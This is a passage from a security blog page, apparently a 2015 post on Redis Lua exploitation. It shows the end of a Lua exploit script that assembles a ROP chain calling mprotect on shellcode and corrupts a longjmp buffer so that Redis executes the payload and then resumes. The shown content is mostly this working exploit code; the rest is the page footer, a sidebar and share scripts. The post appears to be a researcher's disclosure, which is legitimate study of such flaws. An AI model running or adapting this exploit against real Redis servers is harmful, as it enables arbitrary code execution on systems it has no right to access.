</span><span class='line'>          <span class="s2">&quot;</span><span class="s">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="s">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>          <span class="s2">&quot;</span><span class="s">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="s">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="s">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="s">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>           <span class="cm">--[[ poprdipoprbp, ]]</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprsipoprbp</span><span class="p">,</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprbxpopr14poprbp</span><span class="p">,</span> <span class="n">poprbp</span><span class="p">,</span> <span class="n">rdx_all</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">movrdxr14callrbx</span><span class="p">,</span>
</span><span class='line'>           <span class="n">mprotect_addr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>           <span class="n">shellcode_ptr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprdipoprbp</span><span class="p">,</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprsipoprbp</span><span class="p">,</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprbxpopr14poprbp</span><span class="p">,</span> <span class="n">poprbp</span><span class="p">,</span> <span class="n">rdx_read_write</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">movrdxr14callrbx</span><span class="p">,</span>
</span><span class='line'>           <span class="n">mprotect_addr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprdipoprbp</span><span class="p">,</span> <span class="n">old_jump_buf_addr</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">longjmp_addr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>           <span class="s2">&quot;</span><span class="s">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span>
</span><span class='line'>         <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">payload_str</span> <span class="o">=</span> <span class="nb">table.concat</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">payload_string_addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">cstring</span><span class="p">(</span><span class="n">payload_str</span><span class="p">),</span> <span class="mi">4096</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] new sp &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">payload_string_addr</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">--[[ TODO: we always seem to get back strings that are correctly 16 byte aligned. handle unaligned strings? ]]</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">payload_string_addr</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span> <span class="o">~=</span> <span class="mi">8</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">payload not aligned&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="n">write_word</span><span class="p">(</span><span class="n">jmp_buf_sp</span><span class="p">,</span> <span class="n">payload_string_addr</span><span class="p">)</span>
</span><span class='line'>  <span class="n">write_word</span><span class="p">(</span><span class="n">jmp_buf_eip</span><span class="p">,</span> <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprdipoprbp</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">--[[ you can also overwrite the SP at stackpointer - 16 .</span>
</span><span class='line'><span class="cm">  but if we corrupt long jump then it is possible to return back into redis :) ]]</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] executing payload&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="nb">error</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">wat&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nb">coroutine.resume</span><span class="p">(</span><span class="n">co</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] resumed normal redis execution&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nb">collectgarbage</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="mi">42</span>
</span></code></pre></td></tr></table></div></figure>



</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Ben Murphy</span></span>

      








  


<time datetime="2015-06-09T09:53:00+10:00" pubdate data-updated="true"></time>
      


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch/" data-via="benmmurphy" data-counturl="http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch/" >Tweet</a>
  
  
  <div class="g-plusone" data-size="medium"></div>
  
  
    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/06/04/redis-eval-lua-sandbox-escape/" title="Previous Post: Redis EVAL Lua Sandbox Escape">&laquo; Redis EVAL Lua Sandbox Escape</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass/" title="Next Post: ZDI-13-075 (2013) Java 1.7.0_09 Sandbox Bypass Via ConcurrentHashMap">ZDI-13-075 (2013) Java 1.7.0_09 Sandbox Bypass Via ConcurrentHashMap &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/07/06/postgresql-non-durable-reads/">Postgresql Non-Durable Reads</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/06/07/voltdb-command-logging-quirks/">VoltDB Command Logging Quirks</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/06/02/fsync-db-lock-contention/">FSync DB Lock Contention</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/08/09/mechanically-solving-avalon/">Mechanically Solving Avalon</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/08/09/avalon-fonix-slash-grabyo-meta-snapshot/">Avalon Fonix/Grabyo Meta Snapshot</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - Ben Murphy -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'benmmurphy';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch/';
        var disqus_url = 'http://benmmurphy.github.com/blog/2015/06/09/redis-hot-patch/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>



  <script type="text/javascript">
    (function() {
      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
      script.src = 'https://apis.google.com/js/plusone.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
    })();
  </script>



  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
